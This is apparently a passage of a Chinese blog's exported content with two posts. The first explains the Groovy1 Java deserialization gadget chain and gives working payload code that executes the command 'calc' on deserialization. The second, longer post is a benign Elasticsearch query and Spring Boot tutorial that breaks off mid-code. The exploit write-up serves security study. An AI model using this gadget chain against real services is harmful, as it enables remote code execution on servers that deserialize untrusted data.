\"calc\".execute();\n    }\n}\n\n```\n实际上就是调用 Runtime.getRuntime().exec() 方法执行系统命令：\n<img src=\"/img/24-6-6/3.png\" >\n在 Java 中，就可以直接写做：\n```groovy\nMethodClosure methodClosure = new MethodClosure(\"calc\", \"execute\");\nmethodClosure.call();\n```\n### ConvertedClosure\norg.codehaus.groovy.runtime.ConvertedClosure 是一个通用适配器，用于将闭包适配到 Java 接口。ConvertedClosure 实现了 ConversionHandler 类，而 ConversionHandler 又实现了 InvocationHandler。所以说 ConvertedClosure 本身就是一个动态代理类。\nConvertedClosure 的构造方法接收一个 Closure 对象和一个 String 类型的 method 方法名，也就是说 ConvertedClosure 会代理这个 Closure 对象，当调用其 method 方法时，将会调用 ConvertedClosure 父类的 invoke 方法，除了 toString 和一些默认方法外，会调用 invokeCustom 方法。\n如果初始化时指定的 method 与 invokeCustom 指定的 method 参数相同，则 invokeCustom 方法将会调用代理对象 Closure 的 call 方法执行传入参数执行。\n<img src=\"/img/24-6-6/4.png\" >\n\n\n\n## 攻击构造\n这里思路就有了，我们知道在cc链的时候，AnnotationInvocationHandler在反序列化的时候，readObject会调用memberValues的entrySet方法\n如果memberValues是由ConvertedClosure 生成MethodClosure的动态代理对象\n，就会调用MethodClosure对象的call方法\n### 流程\n```\nAnnotationInvocationHandler.readObject()\n    Map.entrySet() (Proxy)\n        ConversionHandler.invoke()\n            ConvertedClosure.invokeCustom()\n                MethodClosure.call()\n                    ProcessGroovyMethods.execute()\n```\n### payload\n```java\npublic static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException {\n\t\tMethodClosure methodClosure = new MethodClosure(\"calc\", \"execute\");\n\t\tConvertedClosure closure       = new ConvertedClosure(methodClosure, \"entrySet\");\n\n\t\tClass<?>       c           = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n\t\tConstructor<?> constructor = c.getDeclaredConstructors()[0];\n\t\tconstructor.setAccessible(true);\n\n\t\t// 创建 ConvertedClosure 的动态代理类实例\n\t\tMap handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),\n\t\t\t\tnew Class[]{Map.class}, closure);\n\n\t\t// 使用动态代理初始化 AnnotationInvocationHandler\n\t\tInvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler);\n\t\tSerializeUtil.serialize(invocationHandler);\n\t\tSerializeUtil.unSerialize();\n\t}\n```\n\n流程不复杂，就不调试跟踪了\n## Reference\n\n- [https://su18.org/post/ysoserial-su18-3/#groovy1](https://su18.org/post/ysoserial-su18-3/#groovy1)\n","tags":["java安全","Groovy","反序列化漏洞"],"categories":["java安全"]},{"title":"Elasticsearch","url":"/2024/06/02/Elasticsearch/","content":"\n\n\n\n# Elasticsearch\n\n\n基于java编写的Lucence的一层封装\n## 基本概念\nElasticsearch是面向文档的，关系行数据库\n\n- 索引（indices）:对应mysql中的数据库\n- types: 对应表 \n- documents: 对应mysql中行\n- fields:  对应mysql中的字段\n\n**物理设计**：\n        elasticsearch 在后台把每个索引划分成多个分片，每份分片可以在集群中的不同服务器间迁移\n\n**逻辑设计**：\n        一个索引类型中，包含多个文档，比如说文档1，文档2。 当我们索引一篇文档时，可以通过这样的一个顺序找到 它: 索引 ▷ 类型 ▷ 文档ID ，通过这个组合我们就能索引到某个具体的文档。 注意 : ID不必是整数，实际上它是个字符串。\n\n### 文档\n_文档就是一条一条的数据_\n         elasticsearch 是面向文档的，那么就意味着索引和搜索数据的最小单位是文档，elasticsearch 中，文档有几个 重要属性 :\n\n- **自我包含**，一篇文档同时包含字段和对应的值，也就是同时包含 key:value！\n- **可以是层次型的**，一个文档中包含自文档，复杂的逻辑实体就是这么来的！其实就是个JSON对象\n- **灵活的结构**，文档不依赖预先定义的模式，我们知道关系型数据库中，要提前定义字段才能使用，在 elasticsearch 中，对于字段是非常灵活的，有时候，我们可以忽略该字段，或者动态的添加一个新的字段。\n\n\n\n\n\n   尽管我们可以随意的新增或者忽略某个字段，但是，每个字段的类型非常重要，比如一个年龄字段类型，可以是字符串也可以是整形。因为 elasticsearch 会保存字段和类型之间的映射及其他的设置。这种映射具体到每个映射的每种类型，这也是为什么在 elasticsearch 中，类型有时候也称为映射类型。\n\n### 类型\n​    类型是文档的逻辑容器，就像关系型数据库一样，表格是行的容器。 类型中对于字段的定义称为映射，比如 name 映 射为字符串类型。 我们说文档是无模式的，它们不需要拥有映射中所定义的所有字段，比如新增一个字段，那么 elasticsearch 是怎么做的呢?elasticsearch会自动的将新字段加入映射，但是这个字段的不确定它是什么类型，elasticsearch就开始猜，如果这个值是18，那么elasticsearch会认为它是整形。 但是elasticsearch也可能猜不对， 所以最安全的方式就是提前定义好所需要的映射，这点跟关系型数据库殊途同归了，先定义好字段，然后再使用。\n\n\n\n总之类型就是数据字段对应的数据类型的映射\n\n### 索引\n​    索引是映射类型的容器，elasticsearch 中的索引是一个非常大的文档集合。索引存储了映射类型的字段和其他设置。 然后它们被存储到了各个分片上了。 我们来研究下分片是如何工作的。\n\n物理设计 ：节点和分片如何工作\n\n​    一个集群至少有一个节点，而一个节点就是一个 elasricsearch 进程，节点可以有多个索引默认的，如果你创建索引，那么索引将会有个5个分片 ( primary shard ,又称主分片 ) 构成的，每一个主分片会有一个副本 ( replica shard ,又称复制分片 )\n\n 下图是一个有3个节点的集群，可以看到主分片和对应的复制分片都不会在同一个节点内，这样有利于某个节点挂掉 了，数据也不至于丢失。\n![](https://camo.githubusercontent.com/bdfe42be1c7f7bfd43cf725c109206d87b4d5a23d5097d1fff03663163d2ab4e/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303231303231353131353533313637312e706e673f2c747970655f5a6d46755a33706f5a57356e6147567064476b2c736861646f775f31302c746578745f6148523063484d364c7939696247396e4c6d4e7a5a473475626d56304c33646c61586870626c38304e444d784f44677a4d413d3d2c73697a655f31362c636f6c6f725f4646464646462c745f3730#from=url&id=DxPHD&originHeight=260&originWidth=880&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&status=done&style=none&title=)实际上，一个分片是一个 Lucene 索引，一个包含倒排索引的文件目录，倒排索引的结构使得elasticsearch在不扫描全部文档的情况下，就能告诉你哪些文档包含特定的关键字\n\n### 倒排索引\n​    elasticsearch 使用的是一种称为倒排索引的结构，采用Lucene倒排索引作为底层。这种结构适用于快速的全文搜索， 一个索引由文档中所有不重复的列表构成，对于每一个词，都有一个包含它的文档列表。 例如，现在有两个文档， 每个文档包含如下内容：\n\n```java\nStudy every day, good good up to forever # 文档1包含的内容\nTo forever, study every day, good good up # 文档2包含的内容\n```\n\n​    为了创建倒排索引，我们首先要将每个文档拆分成独立的词(或称为词条或者tokens)，然后创建一个包含所有不重复的词条的排序列表，然后列出每个词条出现在哪个文档 :       \n\n![](https://camo.githubusercontent.com/4465cac9a719b15a6eb7b447d86a2c84b5703b4377df4e826c46099f1e688f34/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303231303231353132323533333339362e706e673f2c747970655f5a6d46755a33706f5a57356e6147567064476b2c736861646f775f31302c746578745f6148523063484d364c7939696247396e4c6d4e7a5a473475626d56304c33646c61586870626c38304e444d784f44677a4d413d3d2c73697a655f31362c636f6c6f725f4646464646462c745f3730#from=url&id=SVhQ0&originHeight=611&originWidth=1004&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&status=done&style=none&title=)\n   现在，我们试图搜索 to forever，只需要查看包含每个词条的文档  \n![](https://camo.githubusercontent.com/c9161246f23f804c797938895c8928cdfc17087c6d2ee1a17edc63a87323ace6/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303231303231353132323535353433322e706e673f2c747970655f5a6d46755a33706f5a57356e6147567064476b2c736861646f775f31302c746578745f6148523063484d364c7939696247396e4c6d4e7a5a473475626d56304c33646c61586870626c38304e444d784f44677a4d413d3d2c73697a655f31362c636f6c6f725f4646464646462c745f3730#from=url&id=anffG&originHeight=239&originWidth=1015&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&status=done&style=none&title=)\n        两个文档都匹配，但是第一个文档比第二个匹配程度更高。如果没有别的条件，现在，这两个包含关键字的文档都将返回。\n\n\n\n​    再来看一个示例，比如我们通过博客标签来搜索博客文章。那么倒排索引列表就是这样的一个结构 :       \n\n![](https://camo.githubusercontent.com/feadd222988837bcc9e1e40daef110bd5925f8d9f04223a49c6a9d452de6db35/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303231303231353132323731353336372e706e673f2c747970655f5a6d46755a33706f5a57356e6147567064476b2c736861646f775f31302c746578745f6148523063484d364c7939696247396e4c6d4e7a5a473475626d56304c33646c61586870626c38304e444d784f44677a4d413d3d2c73697a655f31362c636f6c6f725f4646464646462c745f3730#from=url&id=yaeAH&originHeight=281&originWidth=881&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&status=done&style=none&title=)\n   如果要搜索含有 python 标签的文章，那相对于查找所有原始数据而言，查找倒排索引后的数据将会快的多。只需要 查看标签这一栏，然后获取相关的文章ID即可。完全过滤掉无关的所有数据，提高效率！\n\n\n\n​    在 elasticsearch 中， 索引这个词被频繁使用，这就是术语的使用。在 elasticsearch 中，索引被分为多个分片，每份分片是一个 Lucene 的索引。所以 一个 elasticsearch 索引是由多个Lucene索引组成的。\n\n\n## 基本操作\n### IK分词器\n**分词**：即把一段中文或者别的内容划分成一个个的关键字，我们在搜索时候会把自己的信息进行分词，是因为数据库中或者索引库中的数据也会进行分词，然后进行一个匹配操作，默认的中文分词是将每个字看成一个词，比如 “我爱大数据” 会被分为\"我\"，\"爱\"，\"大\", \"数\"，\"据\"，这显然是不符合要求的，所以我们需要安装中文分词器 ik 来解决这个问题。\n\n  IK提供了两个分词算法：ik_smart 和 ik_max_word ，其中 ik_smart 为最少切分，ik_max_word 为 最细粒度划分\n\n安装：[https://github.com/medcl/elasticsearch-analysis-ik/](https://github.com/medcl/elasticsearch-analysis-ik/)\n安装对应版本并放入plugin目录下\n\n使用：\n\n- ik_smart模式：\n```java\nGET _analyze\n{\n  \"analyzer\":\"ik_smart\",\n  \"text\":\"中国共产党\"\n}\n```\n效果：\n<img src=\"/img/24-6-2/1.png\" >\n\n- ik_max_word模式\n```java\nGET _analyze\n{\n  \"analyzer\":\"ik_max_word\",\n  \"text\":\"中国共产党\"\n}\n```\n效果：\n<img src=\"/img/24-6-2/2.png\" >\n### Rest风格\n\n        什么是 Rest 风格呢?\n\n> **一种软件架构风格，而不是标准，只是提供了一组设计原则和约束条件。它主要用于客户端和服务器交互类的软件。基于这个风格设计的软件可以更简洁，更有层次，更易于实现缓存等机制**。\n\n\n        其中 基本 的 Rest 命令说明：\n\n| method | url地址 | 描述 |\n| --- | --- | --- |\n| PUT | localhost:9200/索引名称/类型名称/文档id | 创建文档（指定文档 id ） |\n| POST | localhost:9200/索引名称/类型名称 | 创建文档（随机文档 id ） |\n| POST | localhost:9200/索引名称/类型名称/文档id/_update | 修改文档 |\n| DELETE | localhost:9200/索引名称/类型名称/文档id | 删除文档 |\n| GET | localhost:9200/索引名称/类型名称/文档id | 通过文档id查询文档 |\n| POST | localhost:9200/索引名称/类型名称/_search | 查询所有数据 |\n\n\n### 关于索引的基本操作\n_**基础测试**_\n\n1. 创建一个索引\n\n_PUT /索引名/类型名/文档id{请求id}_\n```json\n// 命令解释 \n// PUT 创建命令 test1 索引 type1 类型 1 id\nPUT /test1/type1/1\n{\n  \"name\":\"大数据梦想家\",\n  \"age\":21\n}\n```\n如下图所示：<img src=\"/img/24-6-2/3.png\" >返回结果 （是以REST ful 风格返回的 ）：<img src=\"/img/24-6-2/4.png\" >\n那么 name 这个字段用不用指定类型呢。毕竟我们关系型数据库 是需要指定类型的啊\n#### 字段类型\nelasticsearch 常见的字段类型如下：\n\n- 字符串类型\n\n[text](https://www.elastic.co/guide/en/elasticsearch/reference/current/text.html#text) 、 [keyword](https://www.elastic.co/guide/en/elasticsearch/reference/current/keyword.html)\n\n- 数值类型\n\n[long, integer, short, byte, double, float, half_float, scaled_float](https://www.elastic.co/guide/en/elasticsearch/reference/current/number.html)\n\n- 日期类型\n\n[date](https://www.elastic.co/guide/en/elasticsearch/reference/current/date.html)\n\n- 布尔值类型\n\n[boolean](https://www.elastic.co/guide/en/elasticsearch/reference/current/boolean.html)\n\n- 二进制类型\n\n[binary](https://www.elastic.co/guide/en/elasticsearch/reference/current/binary.html)\n\n- 等等\n\n_**PUT新增设置索引规则（设置字段与数据类型）**_\n```json\nPUT /test2\n{\n  \"mappings\": {\n    \"properties\": {\n      \"name\":{\n        \"type\":\"text\"\n      },\n      \"age\":{\n        \"type\":\"long\"\n      },\n      \"birthday\":{\n        \"type\":\"date\"\n      }\n    }\n  }\n}\n```\n输出如下，说明创建成功了\n```json\n{\n  \"acknowledged\" : true,\n  \"shards_acknowledged\" : true,\n  \"index\" : \"test2\"\n}\n```\n_**GET 查看规则信息**_\n现在我们来尝试使用一下 GET 命令，请求具体的信息！\n<img src=\"/img/24-6-2/5.png\" >可以发现通过GET请求，我们能够详细获取到该索引下具体的信息，其中包含字段类型。那上面示例中字段类型是我自己定义的，那么我们不定义类型会是什么情况呢？\n我们首先发起一个PUT请求，创建一个新的索引 test3，并添加一条数据\n```json\nPUT /test3/_doc/1\n{\n  \"name\":\"大数据梦想家\",\n  \"age\":21,\n  \"birthday\":\"2000-02-06\"\n}\n```\n然后通过GET请求，可以发现非常的智能。但是如果我们的文档字段类型没有指定，那么es就会给我们默认配置的字段类型！<img src=\"/img/24-6-2/6.png\" >\n_**UPDATE修改**_\n那如果我们想要修改文档里的字段信息呢？我们可以选择 UPDATE 也可以 选择 PUT进行覆盖\n例如我可以像下图中的例子，将之前test3索引中的1号文档中的 name 字段修改后，重复提交，发现更新成功，但是注意 version 版本号已经变成了2<img src=\"/img/24-6-2/7.png\" >但是注意这种方法有弊端，如果我们在PUT的过程中，遗漏了字段，那么数据就会被新数据覆盖！所以，<font color='red'>修改数据不建议使用PUT覆盖的方式！</font>\n我们使用 POST 命令，在 id 后面跟 _update ，要修改的内容放到 doc 文档(属性)中即可。<img src=\"/img/24-6-2/8.png\" >可以发现此时更新之后的version变成了3。所以，一旦索引被创建了之后，所有的修改都可以通过版本号看到变化。\n_**DELETE删除**_\n<img src=\"/img/24-6-2/9.png\" >结论： 通过 DELETE 命令实现删除，根据请求判断是删除索引还是删除文档记录！因此，<font color='blue'>使用 RESTFUL 风格是我们学习ES值得推荐使用的</font>\n#### 其他命令\n我们可以通过GET _cat/health来获取集群的一个健康状态除了看集群的健康信息，\n通过命令GET _cat/indices?v，我们可以获取到当前索引的很多信息，返回值包括所有索引的状态健康情况，分片，数据储存大小等等<img src=\"/img/24-6-2/10.png\" >\n### 关于文档的基本操作\n接下来我们学习关于文档的基本操作，首先先重新创建一个新的索引，并添加一些数据\n```json\nPUT /alice/user/1\n{\n  \"name\":\"爱丽丝\",\n  \"age\":21,\n  \"desc\":\"在最美的年华，做最好的自己！\",\n  \"tags\":[\"技术宅\",\"温暖\",\"思维活跃\"]\n}\n\nPUT /alice/user/2\n{\n  \"name\":\"张三\",\n  \"age\":23,\n  \"desc\":\"法外狂徒\",\n  \"tags\":[\"渣男\",\"交友\"]\n}\n\nPUT /alice/user/3\n{\n  \"name\":\"路人甲\",\n  \"age\":24,\n  \"desc\":\"不可描述\",\n  \"tags\":[\"靓仔\",\"网游\"]\n}\n```\n接下来就可以进行文档的基本操作了！\n#### 简单查询\n通过 GET 命令，我们可以搜索到指定 id 的文档信息\nGET alice/user/1\n<img src=\"/img/24-6-2/11.png\" >当然这是简单的搜索，下面我们来看一下 es 如何做条件查询\n条件查询_search?q=\n我们可以通过如下命令，来进行条件查询\nGET alice/user/_search?q=name:张三\n<img src=\"/img/24-6-2/12.png\" >\n我们看一下结果 返回并不是 数据本身，是给我们了一个 hits ，还有 _score得分，就是根据算法算出和查询条件匹配度高的分就越高。\n我们在以某度为例的搜索引擎上进行搜索也是一样的道理，权重越高网站的位置就越靠前！\n但我们一般使用**不会直接加条件去查询**，更多的会用到下面要介绍到的**复杂操作搜索**。\n_**复杂操作搜索 select（ 排序，分页，高亮，模糊查询，精准查询！）**_\n为了方便测试，我又执行下面的命令，往Alice索引下添加了2个文档\n```json\nPUT /alice/user/4\n{\n  \"name\":\"爱丽丝学Java\",\n  \"age\":25,\n  \"desc\":\"技术成就自我！\",\n  \"tags\":[\"思维敏捷\",\"喜欢学习\"]\n}\n\nPUT /alice/user/5\n{\n  \"name\":\"爱丽丝学Python\",\n  \"age\":26,\n  \"desc\":\"人生苦短，我用Python！\",\n  \"tags\":[\"好学\",\"勤奋刻苦\"]\n}\n```\n现在我们来构建一个查询：\n```json\nGET alice/user/_search\n{\n  \"query\":{\n    \"match\": {\n      \"name\": \"爱丽丝\"\n    }\n  }\n}\n```\n<img src=\"/img/24-6-2/13.png\" >默认的话，es会查询出文档的所有字段，如果我们**只想要部分的字段**，就可以像下面所展示的demo进行查询：\n```json\nGET alice/user/_search\n{\n  \"query\":{\n    \"match\": {\n      \"name\": \"爱丽丝\"\n    }\n  },\n  \"_source\":[\"name\",\"desc\"]\n}\n```\n如上例所示，在查询中，通过 _source 来控制仅返回 name 和 desc 属性。页面返回的查询结果如下：<img src=\"/img/24-6-2/14.png\" ><font color='red'>一般的，我们推荐使用构建查询，以后在与程序交互时的查询等也是使用构建查询方式处理查询条件，因为该方式可以构建更加复杂的查询条件，也更加一目了然。</font>\n#### 排序查询\n我们说到排序，有人就会想到：正序或倒序。那么我们先来根据age字段倒序查询：\n```json\nGET alice/user/_search\n{\n  \"query\":{\n    \"match\": {\n      \"name\": \"爱丽丝\"\n    }\n  },\n  \"sort\": [\n    { \n      \"age\": \n      { \n        \"order\": \"desc\"\n      }\n\n    }\n  ]\n}\n```\n查询返回的结果如下：<img src=\"/img/24-6-2/15.png\" >同理，如果我们想要正序查询，只需要将desc换成了asc即可。\n```json\nGET alice/user/_search\n{\n  \"query\":{\n    \"match\": {\n      \"name\": \"爱丽丝\"\n    }\n  },\n  \"sort\": [\n    { \n      \"age\": \n      { \n        \"order\": \"asc\"\n      }\n\n    }\n  ],\n  \"from\":0,\n  \"size\":1\n}\n```\n查询结果如下：<img src=\"/img/24-6-2/16.png\" >\n**注意:在排序的过程中，只能使用可排序的属性进行排序。那么可以排序的属性有哪些呢?**\n\n- 数字\n- 日期\n- ID\n\n<font color='red'>其他都不行！</font>\n#### 分页查询\n学到这里，我们也可以看到，我们的查询条件越来越多，开始仅是**简单查询**，慢慢增加**条件查询**，增加排序，对返回结果进行限制。所以，我们可以说，对 于 elasticsearch 来说，所有的查询条件都是**可插拔**的。比如说，我们在查询中，仅对返回结果进行限制:\n```json\nGET alice/user/_search\n{ \n  \"query\":\n  {\"match_all\": {}\n  },\n  \"from\":0,  # 从第n条开始\n  \"size\":4   # 返回n条数据\n}\n```\n分页查询类似于我们SQL中的 limit 语句。在 es 中我们想要实现这样的效果只需要用 from 指定 从第几条数据开始，size指定返回多少条数据即可。<img src=\"/img/24-6-2/17.png\" >\n#### 布尔查询\n**must (and)**\n我们上面已经讲过了通过**构建查询**的方法去做**模糊查询**，那我们如果想多条件查询，例如查询name为alice，并且age是25岁，那该如何查询呢？\n我们通过在 bool属性内使用 must 来作为查询条件！看结果，是不是 有点像and的感觉，里面的条件需要都满足！\n```json\nGET alice/user/_search\n{\n  \"query\":{\n    \"bool\": {\n      \"must\":[\n        {\n          \"match\":{\n            \"name\":\"爱丽丝\"\n          }\n        },\n        {\n          \"match\":{\n            \"age\":25\n          }\n        }\n      ]\n    }\n  }\n}\n```\n查询结果如下<img src=\"/img/24-6-2/18.png\" >**should (or)**\n那么我要查询name为爱丽丝或 age 为 25 的呢？\n我们只需要将boolean属性内的must值换成should 即可，这就有点相当于 or 的感觉\n```json\nGET alice/user/_search\n{\n  \"query\":{\n    \"bool\": {\n      \"should\":[\n        {\n          \"match\":{\n            \"name\":\"爱丽丝\"\n          }\n        },\n        {\n          \"match\":{\n            \"age\":25\n          }\n        }\n      ]\n    }\n  }\n}\n```\n查询结果如下\n<img src=\"/img/24-6-2/19.png\" >**must_not (not)**\n那现在我想要查询年龄不是 25 的 数据，只需要将boolean的属性值换成must_not即可\n```json\nGET alice/user/_search\n{\n  \"query\":{\n    \"bool\": {\n      \"must_not\":[\n        {\n          \"match\":{\n            \"age\":25\n          }\n        }\n      ]\n    }\n  }\n}\n```\n查询结果如下：<img src=\"/img/24-6-2/20.png\" >**Fitter**\n那如果查询 name 为爱丽丝，age 大于 24 的数据，需要使用到filter进行过滤。\n```json\nGET alice/user/_search\n{\n  \"query\":{\n    \"bool\":{\n      \"must\": [\n        {\n          \"match\": {\n            \"name\": \"爱丽丝\"\n          }\n        }\n      ],\n      \"filter\": [\n        {\n          \"range\": {\n            \"age\": {\n              \"gt\": 24\n            }\n          }\n        }\n      ]\n    }\n  }\n}\n```\n查询结果如下，可以发现只有age为25 和 26的两条数据<img src=\"/img/24-6-2/21.png\" >这里就用到了 filter 条件过滤查询，过滤条件的范围用 range 表示，其余操作如下 :\n\n- gt 表示大于\n- gte 表示大于等于\n- lt 表示小于\n- lte 表示小于等于\n\n那现在要查询，例如 age 在24到26之间的数据该如何查询？\n```json\nGET alice/user/_search\n{\n  \"query\":{\n    \"bool\":{\n      \"filter\": [\n        {\n          \"range\": {\n            \"age\": {\n              \"gte\": 24,\n              \"lte\": 26\n            }\n          }\n        }\n      ]\n    }\n  }\n}\n```\n查询结果：<img src=\"/img/24-6-2/22.png\" >\n#### 短语检索\n为了方便测试，我们再加入几条文档数据：\n```json\nPUT /alice/user/6\n{\n  \"name\":\"大数据老K\",\n  \"age\":25,\n  \"desc\":\"技术成就自我！\",\n  \"tags\":[\"男\",\"学习\",\"技术\"]\n}\n\nPUT /alice/user/7\n{\n  \"name\":\"Python女侠\",\n  \"age\":26,\n  \"desc\":\"人生苦短，我用Python！\",\n  \"tags\":[\"靓女\",\"勤奋学习\",\"善于交际\"]\n}\n```\n例如现在需要查询tags中包含“男”的数据\t\n```json\nGET alice/user/_search\n{\n  \"query\":{\n    \"match\":{\n      \"tags\":\"男\"\n    }\n  }\n}\n```\n查询结果如下：\n<img src=\"/img/24-6-2/23.png\" >\n**匹配多个标签**\n既然按照标签检索，那么，能不能写多个标签呢?\n```json\nGET alice/user/_search\n{\n  \"query\":{\n    \"match\":{\n      \"tags\":\"男 学习\"\n    }\n  }\n}\n```\n此时我们可以观察返回的结果，可以发现**只要满足一个标签**就能返回这个数据了\n<img src=\"/img/24-6-2/24.png\" >\n#### 精确查询\nterm查询是直接通过倒排索引指定的词条进程精确查找的！\n**关于分词：**\n\n- term ，不经过分词，直接查询精确的值\n- match，会使用分词器解析！（先分析文档，然后再通过分析的文档进行查询！）\n\n说到分词器解析，就不得不提到两种数据类型：text和keyword。下面我们就来做个测试：\n```json\n// 创建一个索引，并指定类型\nPUT testdb\n{\n  \"mappings\": {\n    \"properties\": {\n\n      \"name\":{\n        \"type\": \"text\"\n      },\n      \"desc\":{\n        \"type\":\"keyword\"\n      }\n    }\n  }\n}\n\n// 插入数据\nPUT testdb/_doc/1\n{\n  \"name\":\"爱丽丝学大数据name\",\n  \"desc\":\"爱丽丝学大数据desc\"\n}\n\nPUT testdb/_doc/2\n{\n  \"name\":\"爱丽丝学大数据name2\",\n  \"desc\":\"爱丽丝学大数据desc2\"\n}\n```\n上述中testdb索引中,字段name在被查询时会被分析器进行分析后匹配查询。而属于keyword类型不会被分析器处理。\n我们来验证一下：\n```json\nGET _analyze\n{\n  \"analyzer\": \"keyword\",\n  \"text\": \"爱丽丝学大数据 name\"\n}\n```\n查询结果：<img src=\"/img/24-6-2/25.png\" >是不是没有被分析~就是简单的一个字符串啊。再测试一下：\n```json\nGET _analyze\n{\n  \"analyzer\": \"standard\",\n  \"text\": \"爱丽丝学大数据 name\"\n}\n```\n查询结果：<img src=\"/img/24-6-2/26.png\" >然后我们可以得出结论：**keyword 字段类型不会被分析器分析**！\n下面我们用前面添加的2条数据做过测试：\n先精准查询text类型的字段\n```json\nGET testdb/_search         // text 会被分析器分析 查询\n{\n  \"query\": {\n    \"term\": {\n      \"name\": \"爱\"\n    }\n  }\n}\n```\n查询结果，2条数据都能匹配到<img src=\"/img/24-6-2/27.png\" >然后用standard类型做精准测试\n```json\nGET testdb/_search          // keyword 不会被分析所以直接查询 \n{\n  \"query\": {\n    \"term\": {\n      \"desc\": \"爱丽丝学大数据desc\"\n    }\n  }\n}\n```\n查询结果，只有1条数据能匹配到<img src=\"/img/24-6-2/28.png\" >\n#### 查找多个精确值\n为了方便测试，我们再添加如下数据：\n```json\nPUT testdb/_doc/3\n{\n  \"t1\":\"22\",\n  \"t2\":\"2021-03-01\"\n}\n\nPUT testdb/_doc/4\n{\n  \"t1\":\"33\",\n  \"t2\":\"2021-03-01\"\n}\n```\n然后进行查询\n```json\nGET testdb/_search\n{\n  \"query\": {\n    \"bool\":{\n      \"should\": [\n        {\n          \"term\": {\n            \"t1\":\"22\"\n          }\n        },\n        {\n          \"term\": {\n            \"t1\":\"33\"\n          }\n        }\n      ]\n    }\n  }\n}\n```\n查询结果：<img src=\"/img/24-6-2/29.png\" >可以发现2条数据也都能查到，证明就算是term精确查询，也能够查询多个值。\n当然，除了 bool 查询之外，下面这种方式也同样是可以的。\n```json\nGET testdb/_doc/_search\n{\n  \"query\":{\n    \"terms\":{\n      \"t1\":[\"22\",\"33\"]\n    }\n  }\n}\n```\n下面要介绍的功能，就是经常被搜索引擎用到的“**高亮显示**”！\n#### 高亮显示\n我们可以通过highlight属性，来对我们查询的结果的指定字段做高亮显示！\n```json\nGET alice/user/_search\n{\n  \"query\":{\n    \"match\": {\n      \"name\": \"爱丽丝\"\n    }\n  },\n  \"highlight\":{\n    \"fields\": {\n      \"name\": {}\n    }\n  }\n}\n```\n观察返回的结果，我们可以发现搜索相关的结果，被加上了高亮标签<em><img src=\"/img/24-6-2/30.png\" >现在效果看到了，那我们有没有办法**自定义样式**呢？\n答案当然是可以的，我们需要在pre_tags中定义标签的前缀，post_tags中定义后缀！\n```json\nGET alice/user/_search\n{\n  \"query\":{\n    \"match\": {\n      \"name\": \"爱丽丝\"\n    }\n  },\n  \"highlight\":{\n    \"pre_tags\": \"<b class='key' style='color:red'>\", \n    \"post_tags\": \"</b>\",\n    \"fields\": {\n      \"name\": {}\n    }\n  }\n}\n```\n查询结果：<img src=\"/img/24-6-2/31.png\" >\n\n## SpringBoot集成ES\n官方文档：[https://www.elastic.co/guide/en/elasticsearch/client/java-api-client/current/getting-started-java.html](https://www.elastic.co/guide/en/elasticsearch/client/java-api-client/current/getting-started-java.html)\n\n**依赖**\n```xml\n<dependency>\n  <groupId>co.elastic.clients</groupId>\n  <artifactId>elasticsearch-java</artifactId>\n  <version>8.13.4</version>\n</dependency>\n\n```\n\n使用springboot\n```xml\n\\<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-data-elasticsearch</artifactId>\n</dependency>\n```\n注意版本要对应\n\n这里我使用最新的用法\n配置\n```java\npackage com.yyjccc.eslearn.config;\n\nimport co.elastic.clients.elasticsearch.ElasticsearchClient;\nimport co.elastic.clients.json.jackson.JacksonJsonpMapper;\nimport co.elastic.clients.transport.ElasticsearchTransport;\nimport co.elastic.clients.transport.rest_client.RestClientTransport;\nimport lombok.Data;\nimport org.apache.http.HttpHost;\nimport org.elasticsearch.client.RestClient;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\n@Configuration\n@Data\npublic class ElasticsearchConfig {\n\n\t@Value(\"${spring.data.es.url}\")\n\tprivate String serverUrl;\n\n\t@Bean\n\tpublic ElasticsearchClient  restClient(){\n\t\tRestClient restClient = RestClient\n\t\t\t\t.builder(HttpHost.create(serverUrl))\n\t\t\t\t.build();\n\n\t\tElasticsearchTransport transport = new RestClientTransport(\n\t\t\t\trestClient, new JacksonJsonpMapper());\n\n\t\tElasticsearchClient esClient = new ElasticsearchClient(transport);\n\t\treturn esClient;\n\t}\n\n}\n\n```\n### 索引\n创建索引\n```java\n@Autowired\n\tprivate ElasticsearchClient esClient;\n\t@Test\n\tvoid contextLoads() throws IOException {\n\t\tCreateIndexRequest createIndexRequest=new CreateIndexRequest.Builder().index(\"test\").build();\n\t\tCreateIndexResponse createIndexResponse = esClient.indices().create(createIndexRequest);\n\t\tSystem.out.println(createIndexResponse);\n\t}\n```\n判断索引是否存在\n```java\n\tvoid hasIndex() throws IOException {\n\t\tExistsRequest indexRequest= new ExistsRequest.Builder().index(\"test\").build();\n\t\tBooleanResponse exists = esClient.indices().exists(indexRequest);\n\t\tSystem.out.println(exists);\n\t}\n```\n删除索引\n```java\nvoid DeleteIndex() throws IOException {\n\t\tDeleteIndexRequest indexRequest=new DeleteIndexRequest.Builder().index(\"test\").build();\n\t\tDeleteIndexResponse delete = esClient.indices().delete(indexRequest);\n\t\tSystem.out.println(delete);\n\t}\n```\n### 文档\n实体类\n```java\npackage com.yyjccc.eslearn.entity;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\n\n\n@Data\n@AllArgsConstructor\npublic class User {\n\tprivate String name;\n\tprivate int age;\n}\n\n```\n创建文档数据\n```java\nvoid addDoc() throws IOException {\n\t\tUser yyjccc = new User(\"yyjccc\", 18);\n\t\tIndexRequest indexRequest= new IndexRequest.Builder<>().index(\"test\")\n\t\t\t\t.id(\"1\")\n\t\t\t\t.timeout(new Time.Builder().time(\"1s\").build())\n\t\t\t\t.document(yyjccc)\n\t\t\t\t.build();\n\t\t//document()设置内容\n\t\t//index()设置索引名称\n\t\t//id 